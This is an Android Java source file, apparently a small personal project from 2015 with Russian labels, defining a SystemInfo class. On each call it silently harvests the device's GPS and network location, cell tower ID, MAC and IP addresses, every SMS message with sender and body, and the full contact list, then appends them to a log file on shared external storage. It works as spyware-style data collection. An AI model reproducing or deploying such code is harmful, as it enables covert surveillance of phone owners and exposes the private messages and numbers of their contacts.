package com.example.eldar.parse;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;

/**
 * Created by Eldar on 19.09.2015.
 */
public class SystemInfo {
    private static String dateTime(){
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss z ");
        String datetime = dateFormat.format(new Date()) ;
        return datetime;
    }
   private   static String getOSInfo()
   {  StringBuilder builder=new StringBuilder();
       String[] cpu = {"/system/bin/cat", "/proc/cpuinfo"};
       builder.append("\n"+printInfo(cpu)+"\n");
       String[] space = {"/system/bin/df"};
      builder.append(printInfo(space)+"\n");
       String[] memory = {"/system/bin/cat", "/proc/meminfo"};
     builder.append(printInfo(memory)+"\n");
       String[] version = {"/system/bin/cat", "/proc/version"};
      builder.append(printInfo(version)+"\n");
       builder.append("---------------------------------");
return  builder.toString();
   }

    private static String printInfo(String[] args)
    { StringBuilder stringBuilder=new StringBuilder();
        try{
            ProcessBuilder builder = new ProcessBuilder(args);

            Process process = builder.start();
            InputStream inputStream = process.getInputStream();
            byte[] b = new byte[4096];
            while(inputStream.read(b) != -1){
                stringBuilder.append(new String(b));
            }
            inputStream.close();
        }
        catch(IOException e){

        }
       return  stringBuilder.toString();
    }
    private   static  String getSMSList(Context context){
        Uri uri = Uri.parse("content://sms/");
        String[] reqCols = new String[] { "address","person","date","body"};

        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(uri, reqCols, null, null, null);
        StringBuilder smsList=new StringBuilder();
        while(cursor.moveToNext())
        {
            smsList.append("\naddress: "+cursor.getString(0)+"\n");
            smsList.append("person: "+cursor.getString(1)+"\n");
            smsList.append("date: "+cursor.getString(2)+"\n");
            smsList.append("body: "+cursor.getString(3)+"\n");
            smsList.append("---------------------------------");
        }
        cursor.close();
        return  smsList.toString();
    }
    private   static String getContactList(Context  context)
    {       StringBuilder builder=new StringBuilder();
        Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {

            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            builder.append("\nИмя: "+name+"\n");
            builder.append("Номер: "+phoneNumber+"\n");
            builder.append("---------------------------------");

        }
        phones.close();
        return  builder.toString();
    }
    public static void getSystemInfo(Context context, String action){





        class netInterface {
            ArrayList<String> ipAddress = null;
            String macAddress = "";
            String name = "";
            String displayName = "";
        }
        String phoneType = "";
        int cell_Id = 0;
        ArrayList<netInterface> net_interfaces = null;
        double latByGps = 0, lonByGps = 0,latByNetwork=0,lonByNetwork=0;


        try{
            TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
                switch (telephonyManager.getPhoneType())
                {
                    case  TelephonyManager.PHONE_TYPE_CDMA:
                        phoneType="GDMA";
                        GsmCellLocation location=(GsmCellLocation)telephonyManager.getCellLocation();
                        cell_Id=location.getCid();
                        break;
                    case TelephonyManager.PHONE_TYPE_GSM:
                        phoneType="GSM";
                        GsmCellLocation location1=(GsmCellLocation)telephonyManager.getCellLocation();
                        cell_Id=location1.getCid();
                        break;
                }
        }
        catch (Exception e){
          Log.d("Blin",e.toString());
        }

        try {
        Enumeration<NetworkInterface>networkInterfaceEnumeration= NetworkInterface.getNetworkInterfaces();
        net_interfaces=new ArrayList<>();
            while (networkInterfaceEnumeration.hasMoreElements())
            {NetworkInterface networkInterface=networkInterfaceEnumeration.nextElement();
                netInterface temp=new netInterface();
                temp.ipAddress=new ArrayList<>();
             byte[]tmp=networkInterface.getHardwareAddress();
                for (int i = 0; i < 6; i++) {
                    if (tmp == null) {
                        temp.macAddress = null;
                        break;
                    }
                    temp.macAddress += Integer.toHexString(tmp[i] & 0xff);
                    if (i < 5) temp.macAddress += ":";
                }
                List<InterfaceAddress> list = networkInterface.getInterfaceAddresses();
                if (list != null) {
                    for (int i = 0; i < list.size(); i++){
                        InterfaceAddress ia = list.get(i);
                        if (ia != null)
                            temp.ipAddress.add(ia.getAddress().getHostAddress());

                    }
                }
                temp.name = "";
                temp.name = networkInterface.getName();
                temp.displayName = networkInterface.getDisplayName();
                net_interfaces.add(temp);
            }
        }
        catch (Exception e)
        {
        Log.d("Blin",e.toString());
        }
        try {
            LocationManager locationManager;
            locationManager = (LocationManager)context.getSystemService(context.LOCATION_SERVICE);
            String provider = LocationManager.GPS_PROVIDER;
            String provider1=LocationManager.NETWORK_PROVIDER;
            Location location = locationManager.getLastKnownLocation(provider);
            Location location1=locationManager.getLastKnownLocation(provider1);
            latByGps = location.getLatitude();
            lonByGps = location.getLongitude();
            latByNetwork=location1.getLatitude();
            lonByNetwork=location1.getLongitude();

        } catch (Exception e){
            latByGps = 0;
            lonByGps = 0;
            latByNetwork=0;
            lonByNetwork=0;
        }

        try {
            File file = new File(Environment.getExternalStorageDirectory() + "/log/sysInfo.log");
            if (!file.exists()){
                file = new File(Environment.getExternalStorageDirectory() + "/log/");
                file.mkdir();
                file = new File(Environment.getExternalStorageDirectory() + "/log/sysInfo.log");
            }
            FileOutputStream fout = new FileOutputStream(file,true);
            OutputStreamWriter writer = new OutputStreamWriter(fout);
            writer.write("\n%\n");
            writer.write("event=" + action + ";\n");
            writer.write("time=" + dateTime() + ";\n");
            writer.write("latitudeByGps=" + Double.toString(latByGps) + ";\n");
            writer.write("longitudeByGps=" + Double.toString(lonByGps) + ";\n");
            writer.write("latitudeByNetwork=" + Double.toString(latByNetwork) + ";\n");
            writer.write("longitudeByNetwork=" + Double.toString(lonByNetwork) + ";\n");
            writer.write("network_type=" + phoneType + ";\n");
            writer.write("base_station_id=" + Integer.toString(cell_Id) + ";\n");
            for (int i = 0; i < net_interfaces.size(); i++){
                writer.write("iface_name=" + net_interfaces.get(i).name + ",");
                writer.write("iface_mac="  + net_interfaces.get(i).macAddress);
                if (net_interfaces.size() - 1 == i)
                    writer.write(";\n"); else writer.write(",");
                for (int j = 0; j < net_interfaces.get(i).ipAddress.size(); j++){
                    if (net_interfaces.get(i).ipAddress.get(j) != null){
                        writer.write("ip_addr="  + net_interfaces.get(i).ipAddress.get(j));
                        if (j == net_interfaces.size() - 1) writer.write(";\n"); else writer.write(",");
                    }
                }

            }
            writer.write("\nСообщения:\n");
            writer.write(getSMSList(context));
            writer.write("\nСписок контактов:\n");
            writer.write(getContactList(context));
            writer.write("\nИнформация о системе:\n");
            writer.write(getOSInfo());
            writer.write("\n%");
            writer.flush();
            writer.close();
        } catch (Exception e){
            return;
        }

    }
}
